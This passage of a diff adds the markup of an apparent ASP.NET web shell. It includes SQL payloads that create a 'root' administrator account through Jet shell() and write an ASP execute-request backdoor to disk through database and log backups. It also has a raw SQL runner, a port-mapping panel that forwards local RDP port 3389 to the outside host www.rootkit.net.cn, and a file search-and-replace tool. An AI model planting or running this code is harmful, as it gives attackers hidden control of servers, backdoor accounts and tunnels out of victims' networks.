openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')">SandBox</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\1.asp' backup log @b to disk=@t with init,no_truncate;drop table [bin_cmd];">LogBackup</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup database @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\bin.asp' backup database @b to disk=@t WITH DIFFERENTIAL,FORMAT;drop table [bin_cmd];">DatabaseBackup</asp:ListItem></asp:DropDownList>
+
+</div>
+
+<table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td> Run SQL </td></tr><tr><td><textarea id="jHIy" class="area" style="width:600px;height:60px;overflow:auto;" runat="server" rows="6" cols="1"></textarea></td></tr><tr><td>
+
+<asp:Button runat="server" ID="WOhJ" CssClass="bt" Text="Query" onclick="ORUgV"/></td></tr></table>
+
+<div style="overflow-x:auto;width:950px" >
+
+<p>
+
+<asp:DataGrid runat="server" ID="rom" HeaderStyle-CssClass="head" BorderWidth="0" GridLines="None" ></asp:DataGrid>
+
+</p>
+
+</div>
+
+</div>
+
+</div>
+
+<%--PortMap--%>
+
+<div id="hOWTm" runat="server">
+
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+
+<tr align="center">
+
+<td style="width:5%"></td>
+
+<td style="width:20%" align="left">Local Ip : <input class="input" runat="server" id="eEpm" type="text" size="20" value="127.0.0.1"/></td>
+
+<td style="width:20%" align="left">Local Port : <input class="input" runat="server" id="iXdh" type="text" size="20" value="3389"/></td>
+
+<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="llH" type="text" size="20" value="www.rootkit.net.cn"/></td>
+
+<td style="width:20%" align="left">Remote Port : <input class="input" runat="server" id="ZHS" type="text" size="20" value="80"/></td></tr>
+
+<tr align="center"><td colspan="5"><br/><asp:Button ID="FJE" CssClass="bt" runat="server" Text="MapPort" OnClick="wDZ"/> <asp:Button ID="giX" CssClass="bt" runat="server" Text="ClearAll" OnClick="vJNsE"/> <asp:Button ID="GFsm" CssClass="bt" runat="server" Text="Refresh" OnClick="tYoZ"/></td></tr></table></div>
+
+<%--Search--%>
+
+<div id="yhv" runat="server">
+
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+
+<tr align="center">
+
+<td style="width:20%" align="left">Keyword</td>
+
+<td style="width:60%" align="left"><textarea id="iaMKl" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
+
+<td style="width:20%" align="left"><input type="checkbox" runat="server" id="rAQ" value="1"/> Use Regex</td>
+
+</tr>
+
+<tr align="center">
+
+<td style="width:20%" align="left">Replace As</td>
+
+<td style="width:60%" align="left"><textarea id="qPe" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
+
+<td style="width:20%" align="left"><input type="checkbox" runat="server" id="YZw"/> Replace</td>
+
+</tr>
+
+<tr align="center">
+
+<td style="width:20%" align="left">Search FileType</td>
+
+<td style="width:60%" align="left"><input type="text" runat="server" class="input" id="UDLvA" style="width:100%" value="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"/></td>
+
+<td style="width:20%" align="left"><asp:DropDownList runat="server" ID="Ven" AutoPostBack="False" CssClass="list"><asp:ListItem Value="name">File Name</asp:ListItem><asp:ListItem Value="content" Selected="True">File Content</asp:ListItem></asp:DropDownList></td>
+
+</tr>
+
+<tr align="center">
+
+<td style="width:20%" align="left">Path</td>
+
+<td style="width:60%" align="left"><input type="text" class="input" id="NaLJ" runat="server" style="width:100%" /></td>
+
+<td style="width:20%" align="left"><asp:Button CssClass="bt" id="axy" runat="server" onclick="NBy" Text="Start" /></td>
+
+</tr>
+
+</table>
+
+<br/>
+
+<br/>
+
+<asp:Table ID="oJiym" runat="server" Width="100%" CellSpacing="0" >
+
+<asp:TableRow CssClass="head"><asp:TableCell Width="60%">File Path</asp:TableCell><asp:TableCell Width="20%">Last modified</asp:TableCell><asp:TableCell Width="20%">Size</asp:TableCell></asp:TableRow>
+
+</asp:Table>
+
+</div>
+
+</td></tr></table>
+
+<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"></div></div>
+
+</form>
